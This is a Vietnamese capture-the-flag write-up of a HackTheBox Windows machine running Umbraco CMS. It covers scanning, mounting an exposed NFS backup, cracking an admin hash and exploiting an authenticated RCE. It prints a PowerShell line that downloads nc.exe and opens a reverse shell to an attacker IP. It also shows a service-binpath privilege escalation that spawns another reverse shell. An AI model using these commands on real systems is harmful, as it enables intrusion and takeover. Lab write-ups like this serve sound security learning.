## Recon
### Nmap
Việc sử dụng nmap để quét toàn bộ cổng của machine là 1 việc làm bất di bất dịch nếu các bạn muốn tấn công lên machine đó.
```bash
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
Host script results:
|_clock-skew: 3m03s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-12T13:13:30
|_  start_date: N/A
```

Ở đây chúng ta thấy có khá nhiều port đang mở, mình thì hay khám phá các dịch vụ web trước :P. Tuy nhiên vào trang web thì cũng chẳng có gì nhiều.

![](https://images.viblo.asia/6396597e-f2a8-45e2-8de4-6ef53917b7a4.png)


### Fuzz 
Check qua một lượt trang web dường như không có gì, thì chúng ta cần fuzzing xem có dịch vụ web nào tại port 80 nữa không.  
Sử dụng gobuster để recon:
```
gobuster dir -u http://10.10.10.180 -w /usr/share/wordlists/dirb/common.txt
```
Kết quả có 1 thư mục là `/umbraco` chạy Umbraco CMS 

Có một trang đăng nhập 

![](https://images.viblo.asia/d7dc264c-c561-4ed9-bf0c-9bc0a972ab38.png)

## Get User

Searchsploit xem có CVE nào k thì thấy có 1 cái RCE được 
```
➜  Remote searchsploit umbraco
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                | exploits/aspx/webapps/46153.py
```
Nhưng rất tiếc là cần phải đăng nhập mới có thể RCE được, tiếp tục đi tìm tài khoản đăng nhập của web.

Trong kết quả nmap thấy có cổng 111 đang mở, ở Linux có lệnh `showmount` để xem có thư mục nào đang public hay không
```sh
➜  Remote sudo showmount -e remote.htb
Export list for remote.htb:
/site_backups (everyone)
```
Thấy có thư mục public, thực hiện mount vào để đọc thêm thông tin
```
➜  Remote sudo mount -t nfs remote.htb:/site_backups .             
➜  Remote ls
App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config
App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views
```
Quá trời quá đất thư mục, đọc lần lượt thì thấy có 1 file tên là `Umbrella.sdf`. Khuyến khích mở file này bên Win, mở bên Kali lag lòi kèn @@

![](https://images.viblo.asia/ba39e92c-7b68-47ce-ae0d-7bfe309f1ed1.png)


Thấy có một vài mã hash passwd, list ra. Đã sử dụng `psexe.py` với những hash này nhưng k được, sử dụng `John` để crack passwd thì lấy được 1 account tên là `admin@htb.local:baconandcheese`. Sử dụng tài khoản này để đăng nhập vào trang login lúc nãy thì đăng nhập được.

![](https://images.viblo.asia/2691ade1-0211-442a-b8c1-1b964e3c14d6.png)

Kiểm tra phiên bản đúng là phiên bản 7.12.4, sử dụng lỗ hổng RCE bên trên tìm được để khai thác, thực hiện custom mã đi một chút.

```powershell
Invoke-WebRequest -Uri http://10.10.14.5:8080/nc.exe -OutFile C:/windows/temp/nc.exe; C:/windows/temp/nc.exe 10.10.14.5 4444 -e powershell
```

Hoặc đơn giản hơn có thể sử dụng mã khác xịn hơn tại https://github.com/noraj/Umbraco-RCE, mã này dễ sử dụng hơn và k cần phải custom giống mã trên exploitdb

Lấy được cờ user trong `Public`

## Get Root
Việc lên Root này mình đã có bài viết chi tiết tại https://viblo.asia/p/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits-vyDZO7QOZwj

Kiểm tra dịch vụ đang có trên box
```
PS C:\Users\Administrator\Documents> Get-Service
Stopped  UsoSvc             Update Orchestrator Service
```
Có dịch vụ này của Windows Update, tìm thấy trên Payload All The Thing
[cve-2019-1322-usosvc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#example-with-windows-10---cve-2019-1322-usosvc)

Có payload rồi, vậy thì cứ step by step là ra thôi :D
```powershell
PS C:\Windows\system32> sc.exe stop UsoSvc
PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd \c C:\nc.exe 10.10.14.5 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe qc usosvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: usosvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\nc.exe 10.10.14.5 4444 -e cmd.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem

PS C:\Windows\system32> sc.exe start UsoSvc
```
Lên root rồi lấy cờ cuối thôi :D
```powershell
PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> type root.txt
3b9f87e333e859963172519b3b724462
```
## Kết luận
Đây là một bài khá cơ bản với machine Windows, hi vọng các bạn đọc bài viết này của mình sẽ thu lại được thứ gì đó, happy hacking :D